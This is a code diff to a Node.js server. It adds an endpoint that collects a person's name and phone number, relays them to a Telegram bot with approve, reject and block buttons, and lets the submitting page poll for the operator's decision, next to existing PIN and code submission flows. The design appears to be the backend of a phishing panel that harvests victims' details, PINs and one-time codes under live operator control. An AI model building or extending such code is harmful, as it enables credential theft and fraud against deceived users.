@@ -14,16 +14,18 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 
 let approvedPins = {};
 let approvedCodes = {};
+let approvedDetails = {};
 let blockPins = {};
 let requestBotMap = {};
 
 try {
     if (fs.existsSync(DATA_FILE)) {
         const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-        approvedPins   = saved.approvedPins   || {};
-        approvedCodes  = saved.approvedCodes  || {};
-        blockPins      = saved.blockPins      || {};
-        requestBotMap  = saved.requestBotMap  || {};
+        approvedPins    = saved.approvedPins    || {};
+        approvedCodes   = saved.approvedCodes   || {};
+        approvedDetails = saved.approvedDetails || {};
+        blockPins       = saved.blockPins       || {};
+        requestBotMap   = saved.requestBotMap   || {};
         console.log('💾 Data restored from data.json');
     }
 } catch (e) {
@@ -33,7 +35,7 @@ try {
 function persist() {
     try {
         fs.writeFileSync(DATA_FILE, JSON.stringify({
-            approvedPins, approvedCodes, blockPins, requestBotMap
+            approvedPins, approvedCodes, approvedDetails, blockPins, requestBotMap
         }));
     } catch (e) {
         console.error('❌ Persist failed:', e.message);
@@ -160,6 +162,44 @@ app.get('/health', (req, res) => {
     });
 });
 
+// ---------------- DETAILS SUBMISSION (index.html) ----------------
+app.post('/submit-details', (req, res) => {
+    const { name, phone, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+
+    const requestId = uuidv4();
+    approvedDetails[requestId] = null;
+    requestBotMap[requestId] = botId;
+    persist();
+
+    const text =
+        `👤 *CUSTOMER DETAILS*\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 *Name:*  \`${name}\`\n` +
+        `📱 *Phone:* \`${phone}\`\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `⏳ _Awaiting admin decision…_`;
+
+    sendTelegramMessage(bot, text, [
+        [
+            { text: '✅ Approve Details', callback_data: `details_ok:${requestId}` },
+            { text: '❌ Reject Details',  callback_data: `details_bad:${requestId}` }
+        ],
+        [
+            { text: '🛑 Block User', callback_data: `details_block:${requestId}` }
+        ]
+    ]);
+
+    res.json({ requestId });
+});
+
+app.all('/check-details/:requestId', (req, res) => {
+    const requestId = req.params.requestId;
+    if (blockPins[requestId]) return res.json({ blocked: true, approved: null });
+    res.json({ approved: approvedDetails[requestId] ?? null, blocked: false });
+});
+
 // ---------------- PIN SUBMISSION ----------------
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
@@ -259,7 +299,23 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     let feedback = '';
     let statusLine = '';
 
-    if (action === 'pin_ok') {
+    if (action === 'details_ok') {
+        approvedDetails[requestId] = true;
+        persist();
+        feedback = '🟢 Details approved';
+        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *DETAILS APPROVED*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
+    } else if (action === 'details_bad') {
+        approvedDetails[requestId] = false;
+        persist();
+        feedback = '🔴 Details rejected';
+        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n❌ *DETAILS REJECTED*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
+    } else if (action === 'details_block') {
+        approvedDetails[requestId] = false;
+        blockPins[requestId] = true;
+        persist();
+        feedback = '🔴 User blocked';
+        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n🛑 *USER BLOCKED*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
+    } else if (action === 'pin_ok') {
         approvedPins[requestId] = true;
         persist();
         feedback = '🟢 PIN approved';
